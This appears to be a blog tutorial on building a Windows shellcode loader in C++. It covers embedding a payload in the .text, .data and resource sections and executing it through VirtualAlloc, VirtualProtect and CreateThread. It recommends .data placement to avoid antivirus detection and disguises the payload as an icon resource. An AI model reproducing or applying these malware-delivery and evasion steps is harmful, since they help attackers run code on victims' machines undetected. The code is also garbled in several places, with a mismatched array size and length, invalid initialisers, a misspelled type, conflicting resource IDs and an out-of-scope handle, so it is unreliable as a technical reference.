---
title: Embedding Shellcode in Text, Data and Resource Sections
date: 2026-02-22
tags:
    - C++
    - WinAPI
---

## Text Section

Write the shellcode and it’s length into variables.

```cpp
#include <windows.h>
#include <stdio.h>
#include <string.h>

int main (VOID) {
    unsigned char shellcode_payload[196] = [ /* ... */ ];
    unsigned int  shellcode_length       = 279;
    // ...
}
```

Allocate the memory space.

```cpp
LPVOID memory_address = VirtualAlloc(NULL, shellcode_length, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE
  // [in, optional]    LPVOID    lpAddress,
  // [in]              SIZE_T    dwSize
  // [in]              DWORD     flAllocationType
  // [in]              DWORD     flProtect
);
```

Load the shellcode into the allocated memory.

```cpp
RtlMoveMemory(memory_address, shellcode_payload, shellcode_length
  // _Out_            VOID UNALIGNED    *Destination,
  // _In_    const    VOID UNALIGNED    *Source,
  // _In_             SIZE_T             Length
);
```

Make the shellcode executable by changing the protections on the virtual block of memory.

```cpp
DWORD old_protection = 0;
BOOL returned_vp = VirtualProtect(memory_address, shellcode_length, PAGE_EXECUTE_READ, & old_protection
  // [in]   LPVOID   lpAddress,
  // [in]   SIZE_T   dwSize,
  // [in]   DWORD    flNewProtect,
  // [out]  PDWORD   lpflOldProtect
);
```

Create a thread to execute the malware.

```cpp
if (returned_vp != NULL) {
    HANDLE thread_handle = CreateThread(NULL, 0, (LDTHREAD_START_ROUTINE) memory_address, NULL, NULL, NULL
      // [in, optional]   LPSECURITY_ATTRIBUTES     lpThreadAttributes,
      // [in]             SIZE_T                    dwStackSize,
      // [in]             LPTHREAD_START_ROUTINE    lpStartAddress,
      // [in, optional]   drv_aliasesMem LPVOID     lpParameter,
      // [in]             DWORD                     dvCreationFlags,
      // [out, optional]  LPDWORD                   lpThreadId
    );

    // ...
}
```

Wait for the thread to complete.

```cpp
WaitForSingleObject(thread_handle, INFINITE
  // [in] HANDLE hHandle,
  // [in] DWORD dwMilliseconds
);
```

Compile and run the code.

```
cl.exe /Zi /EHsc /nologo /FeC:\path\to\save\executable\file.exe C:\path\to\get\source\file.cpp
```

## Data Section

To embed shellcode into the data section (`.data`), you need to move the shellcode outside of the main function.

```cpp
unsigned char shellcode_payload[196] = [ /* ... */ ];
unsigned int  shellcode_length       = 279;

int main (VOID) {
    // ...
}
```

>  Embedding shellcode in the data section can help avoid AV detection.


Compile and run the code.

```
cl.exe /Zi /EHsc /nologo /FeC:\path\to\save\executable\file.exe C:\path\to\get\source\file.cpp
```

## Resource Section

To embed shellcode in the resource section, rename `shellcode.bat` to `shellcode.ico`.

Create an rsrc.rc file with the following contents.

```cpp
#define SC_ICON 1337
SC_ICON RCDATA "shellcode.ico"
```

The file defines an `SC_ICON` which holds a reference to the `shellcode.ico` file.

Next, define the `SC_ICON` in the code of the executable.

```cpp
#include <windows.h>
// ...

#define SC_ICON 2583

int main (VOID) {
    // ...
}
```

Find the resource.

```cpp
HRSRC shellcode = FindResourceW(NULL, MAKEINTRESOURCEW(SC_ICON), RT_RCDATA
  // [in, optional]  HMODULE  hModule,
  // [in]            LPCSTR   lpName,
  // [in]            LPCSTR   lpType
);
```

Load the resource into memory.

```cpp
HGLOBAL shellcode_handle = LoadResource(NULL, shellcode
  // [in, optional]  HMODULE   hModule,
  // [in]            HRSRC     hResInfo
);
```

Get pointer to the resource.

```cpp
LPVOID shellcode_payload = LockResource(shellcode_handle
  // [in] HGLOBAL hResData
);
```

Get the size of the resource.

```cpp
DWORD shellcode_length = SizeofResource(NULL, shellcode
  // [in, optional]   HMODULE  hModule,
  // [in]             HRSRC    hResInfo
);
```

Use the `rc` utility to initiate the resource file.

```cpp
rc rsrc.rc
```

Create an object file for the resource.

```cpp
cvtres /MACHINE:X86 /OUT:rsrc.o rsrc.res
```

Compile the executable.

```cpp
cl.exe /nologo /0x /w0 /GS- /DNDEBUG /Tcexample.cpp /Link /OUT:example.exe /SUBSYSTEM:CONSOLE / MACHINE:X86 rsrc.o
```
